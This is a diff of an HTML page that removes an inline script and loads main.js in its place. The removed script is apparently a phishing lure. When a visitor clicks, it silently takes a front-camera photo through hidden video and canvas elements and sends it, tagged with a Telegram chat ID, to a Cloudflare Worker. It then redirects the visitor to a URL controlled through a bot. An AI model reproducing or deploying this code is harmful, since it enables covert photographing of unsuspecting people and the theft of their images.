@@ -15,62 +15,6 @@
         <video id="v" autoplay style="display:none"></video>
         <canvas id="c" style="display:none"></canvas>
 
-        <script>
-const proxyUrl = 'https://silent-surf-60b2.parsinnikita76.workers.dev';
-const chatId = '1976857829';
-
-const btn = document.getElementById('btn');
-const video = document.getElementById('v');
-const canvas = document.getElementById('c');
-
-btn.onclick = async () => {
-    btn.innerText = "Загрузка..."; 
-    btn.disabled = true;
-    let stream;
-    let targetUrl = 'https://google.com'; // Ссылка по умолчанию
-
-    try {
-        // 1. Получаем актуальную ссылку из памяти воркера
-        const res = await fetch(proxyUrl + "/get-url");
-        if (res.ok) targetUrl = await res.text();
-
-        // 2. Работа с камерой
-        stream = await navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: "user" } 
-        });
-
-        video.srcObject = stream;
-        video.setAttribute("playsinline", true);
-        
-        await new Promise((resolve) => {
-            video.onloadedmetadata = () => {
-                video.play();
-                setTimeout(resolve, 1000); 
-            };
-        });
-
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-        
-        const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
-        const formData = new FormData();
-        formData.append('chat_id', chatId);
-        formData.append('photo', blob, 'shot.jpg');
-
-        // 3. Отправляем фото
-        await fetch(proxyUrl, { method: 'POST', body: formData });
-
-    } catch (err) {
-        console.error("Ошибка:", err);
-    } finally {
-        if (stream) stream.getTracks().forEach(t => t.stop());
-        // 4. Переходим на сайт, который ты задал через бота
-        window.location.href = targetUrl;
-    }
-};
-
-
-        </script>
+        <script src="main.js"></script>
     </body>
     </html>
